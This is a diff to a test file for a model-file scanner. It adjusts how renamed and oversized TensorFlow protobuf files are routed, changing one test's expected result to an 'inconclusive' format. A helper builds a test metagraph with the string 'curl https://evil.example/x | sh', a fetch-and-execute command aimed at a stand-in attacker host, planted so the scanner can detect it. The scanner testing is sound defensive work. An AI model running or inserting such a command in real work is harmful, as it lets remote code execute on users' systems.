@@ -117,7 +117,6 @@ def _build_tf_collection_only_metagraph_bytes() -> bytes:
 
     meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
     metagraph = meta_graph_pb2.MetaGraphDef()
-    metagraph.graph_def.SetInParent()
     metagraph.collection_def["runtime_hook"].bytes_list.value.append(b"curl https://evil.example/x | sh")
     return cast(bytes, metagraph.SerializeToString())
 
@@ -1563,8 +1562,8 @@ def test_detect_oversized_renamed_tf_savedmodel_routes_to_bounded_scan(tmp_path:
     assert detect_file_format(str(oversized_savedmodel)) == "tf_savedmodel"
 
 
-def test_detect_oversized_renamed_tf_savedmodel_metagraph_routes_to_bounded_scan(tmp_path: Path) -> None:
-    oversized_savedmodel = tmp_path / "saved-oversized-metagraph.jpg"
+def test_detect_versioned_protobuf_with_oversized_field_two_stays_inconclusive(tmp_path: Path) -> None:
+    oversized_savedmodel = tmp_path / "versioned-oversized-field-two.jpg"
     oversized_metagraph_size = 20 * 1024 * 1024 + 1
     oversized_savedmodel.write_bytes(
         _proto_varint_field(1, 1)
@@ -1573,9 +1572,11 @@ def test_detect_oversized_renamed_tf_savedmodel_metagraph_routes_to_bounded_scan
         + (b"x" * oversized_metagraph_size)
     )
 
-    assert detect_file_format_from_magic(str(oversized_savedmodel)) == "tf_metagraph"
-    assert detect_file_format_for_skip_filter(str(oversized_savedmodel)) == "tf_metagraph"
-    assert detect_file_format(str(oversized_savedmodel)) == "tf_metagraph"
+    assert detect_file_format_from_magic(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert (
+        detect_file_format_for_skip_filter(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    )
+    assert detect_file_format(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
 
 
 def test_detect_oversized_renamed_tf_savedmodel_continues_past_empty_metagraph(tmp_path: Path) -> None:
